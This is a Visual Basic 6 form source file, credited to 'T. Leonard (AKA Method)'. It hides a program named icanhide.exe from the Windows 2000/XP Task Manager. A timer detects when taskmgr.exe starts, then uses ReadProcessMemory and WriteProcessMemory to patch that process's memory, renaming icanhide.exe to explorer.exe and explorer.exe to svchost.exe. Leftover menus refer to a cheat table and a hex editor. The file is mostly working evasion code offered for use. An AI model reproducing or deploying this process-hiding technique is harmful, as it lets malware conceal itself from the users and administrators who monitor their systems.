VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Hiding From XP TaskManager"
   ClientHeight    =   360
   ClientLeft      =   150
   ClientTop       =   420
   ClientWidth     =   7230
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   360
   ScaleWidth      =   7230
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   60
      ScaleHeight     =   195
      ScaleWidth      =   7035
      TabIndex        =   5
      Top             =   60
      Width           =   7095
      Begin VB.PictureBox Picture2 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   0
         ScaleHeight     =   165
         ScaleWidth      =   7005
         TabIndex        =   6
         Top             =   0
         Width           =   7035
         Begin VB.Label lblStatus2 
            Alignment       =   2  'Center
            BackColor       =   &H00FFFFFF&
            BackStyle       =   0  'Transparent
            Caption         =   "Press CTRL+ALT+DEL To Bring Up Task Manager"
            BeginProperty Font 
               Name            =   "Verdana"
               Size            =   6.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00404040&
            Height          =   195
            Left            =   -15
            TabIndex        =   8
            Top             =   -15
            Width           =   7095
         End
      End
      Begin VB.Label lblStatus 
         Alignment       =   2  'Center
         BackColor       =   &H00FFFFFF&
         BackStyle       =   0  'Transparent
         Caption         =   "Press CTRL+ALT+DEL To Bring Up Task Manager"
         BeginProperty Font 
            Name            =   "Verdana"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   255
         Left            =   0
         TabIndex        =   7
         Top             =   0
         Width           =   7095
      End
   End
   Begin VB.Timer Timer3 
      Interval        =   500
      Left            =   120
      Top             =   0
   End
   Begin VB.Label Label10 
      BorderStyle     =   1  'Fixed Single
      Caption         =   "10000"
      Height          =   255
      Left            =   5940
      TabIndex        =   4
      Top             =   7080
      Width           =   1095
   End
   Begin VB.Label Label9 
      BorderStyle     =   1  'Fixed Single
      Height          =   255
      Left            =   7020
      TabIndex        =   3
      Top             =   7080
      Width           =   855
   End
   Begin VB.Label Label6 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      Caption         =   "255"
      Height          =   255
      Left            =   8700
      TabIndex        =   2
      Top             =   7080
      Width           =   495
   End
   Begin VB.Label Label7 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      Caption         =   "0"
      Height          =   255
      Left            =   9180
      TabIndex        =   1
      Top             =   7080
      Width           =   315
   End
   Begin VB.Label Label8 
      Alignment       =   2  'Center
      BorderStyle     =   1  'Fixed Single
      Caption         =   "32"
      Height          =   255
      Left            =   7860
      TabIndex        =   0
      Top             =   7080
      Width           =   855
   End
   Begin VB.Menu mnuBM 
      Caption         =   "Bookmarks"
      Visible         =   0   'False
      Begin VB.Menu mnuMBdelsel 
         Caption         =   "Remove Selected Bookmark"
      End
      Begin VB.Menu mnuBMdelall 
         Caption         =   "Clear Bookmarks"
      End
   End
   Begin VB.Menu mnuResults 
      Caption         =   "Results"
      Visible         =   0   'False
      Begin VB.Menu mnuAddtoactive 
         Caption         =   "Add to Active Cheats"
      End
      Begin VB.Menu mnuDiv2038 
         Caption         =   "-"
      End
      Begin VB.Menu mnuAddBMarkAll 
         Caption         =   "Add all results to Bookmarks"
      End
      Begin VB.Menu mnuAddBMarkx 
         Caption         =   "Add to Bookmarks"
      End
      Begin VB.Menu mnuDiv2040 
         Caption         =   "-"
      End
      Begin VB.Menu mnuHexEd 
         Caption         =   "View In Hex Editor"
      End
   End
   Begin VB.Menu mnuActives 
      Caption         =   "Actives"
      Visible         =   0   'False
      Begin VB.Menu mnuaddtotable 
         Caption         =   "Add to Cheat Table"
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Hide from tskmgr.exe on 2k/XP - Including disguise from processes!
' ==================================================================
' Code by T. Leonard (AKA Method)
' -------------------------------
' http://methlabs.org

Private Sub Form_Click()
End
End Sub

Private Sub Form_Load()
Picture2.Width = 0
App.Title = ""
Me.Show
DoEvents
'Me.Hide
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub lblStatus_Click()
End
End Sub

Private Sub lblStatus2_Click()
End
End Sub

Public Sub Timer3_Timer()

'Disable this event until processing complete. - Stops CPU hammering!!
    Timer3.Enabled = False
    newproclist$ = ""
    Dim myProcess As PROCESSENTRY32
    Dim mySnapshot As Long

    myProcess.dwSize = Len(myProcess)
    mySnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)

    ProcessFirst mySnapshot, myProcess

    '------------------
    'Is this task new??
    '------------------
    If InStr(1, myproclist$, "[" & myProcess.th32ProcessID & "]") = 0 Then
        '-----------------------
        'Is this "taskmgr.exe"??
        '-----------------------
        If Left(myProcess.szexeFile, InStr(myProcess.szexeFile, Chr(0)) - 1) = "taskmgr.exe" Then
            '----------------------------------------------------------
            'Yes.. then disguise "icanhide.exe" in the processes memory
            '----------------------------------------------------------
            REPSTRINGINPROC myProcess.th32ProcessID, 1
            REPSTRINGINPROC myProcess.th32ProcessID, 0
            'Me.Hide
        Else
            DoEvents 'ignore this process
        End If
    End If
    
    'create new process list (to replace myproclist$ later - the comparison list)
    newproclist$ = "[" & myProcess.th32ProcessID & "]"
    
   'Same as above but for each of the other processes
    While ProcessNext(mySnapshot, myProcess)
        If InStr(1, myproclist$, "[" & myProcess.th32ProcessID & "]") = 0 Then
            If Left(myProcess.szexeFile, InStr(myProcess.szexeFile, Chr(0)) - 1) = "taskmgr.exe" Then
                    REPSTRINGINPROC myProcess.th32ProcessID, 1
                    REPSTRINGINPROC myProcess.th32ProcessID, 0
                Else
                    DoEvents 'ignore this process
                End If
        End If
        newproclist$ = newproclist$ & "[" & myProcess.th32ProcessID & "]"
    Wend
        
'set myproclist to new processes against latest processes checked
  myproclist$ = newproclist$
  
're-enable the timer
  Timer3.Enabled = True
  
End Sub

Private Sub REPSTRINGINPROC(PIDX As Long, SHOWME As Integer)

If SHOWME = 1 Then Me.Show: DoEvents

If Not InitProcHack(PIDX) Then Exit Sub

'We are using 20016 as opposed to 20000 so that there is an overlap (so we catch the string if it crosses buffer limits!!)

    Dim c As Integer
    Dim addr As Long
    Dim buffer As String * 20016
    Dim readlen As Long
    Dim writelen As Long
If SHOWME = 1 Then
    SRCHSTRING = UNICODE("explorer.exe")
    REPSTRING$ = UNICODE("svchost.exe ")
        frmMain.lblStatus.Caption = "Process patching 1/2..."
        frmMain.lblStatus2.Caption = "Process patching 1/2..."
        DoEvents
        
        For addr = 0 To 4000    ' loop through buffers
        Call ReadProcessMemory(myHandle, addr * 20000, buffer, 20016, readlen)
            If addr / 100 = Int(addr / 100) Then
            frmMain.lblStatus2.Caption = "Process patching 1/2 " & Int(addr / 40) & "%": frmMain.lblStatus.Caption = "Process patching 1/2 " & Int(addr / 40) & "%": Picture2.Width = Int(addr * (Picture1.Width / 4000)): DoEvents
            End If
        
            If readlen > 0 Then
    
              startpos = 1
              While InStr(startpos, buffer, SRCHSTRING) > 0
                p = (addr) * 20000 + InStr(startpos, buffer, SRCHSTRING) - 1 ' position of string
                Call WriteProcessMemory(myHandle, CLng(p), REPSTRING$, Len(REPSTRING$), bytewrite)
                'highpoint = addr
                startpos = InStr(startpos, buffer, Trim(SRCHSTRING)) + 1 ' find next position
              Wend
            End If
                   
        Next addr
        frmMain.lblStatus.Caption = "Process patching 2/2..."
        DoEvents

End If


SRCHSTRING = UNICODE("icanhide.exe")
REPSTRING$ = UNICODE("explorer.exe")

    For addr = 0 To 4000    ' loop through buffers
        If addr / 100 = Int(addr / 100) Then
        frmMain.lblStatus.Caption = "Process patching 2/2 " & Int(addr / 40) & "%": frmMain.lblStatus.Caption = "Process patching 2/2 " & Int(addr / 40) & "%": Picture2.Width = Int(addr * (Picture1.Width / 4000)): DoEvents
        End If
    Call ReadProcessMemory(myHandle, addr * 20000, buffer, 20016, readlen)
        If readlen > 0 Then
    
    
          startpos = 1
          While InStr(startpos, buffer, SRCHSTRING) > 0
            p = (addr) * 20000 + InStr(startpos, buffer, SRCHSTRING) - 1 ' position of string
            Call WriteProcessMemory(myHandle, CLng(p), REPSTRING$, Len(REPSTRING$), bytewrite)
            'highpoint = addr
            startpos = InStr(startpos, buffer, Trim(SRCHSTRING)) + 1 ' find next position
          Wend
        End If
        
    Next addr
    DoEvents
    Close #1
    Me.Hide: DoEvents
    'MsgBox highpoint
End Sub


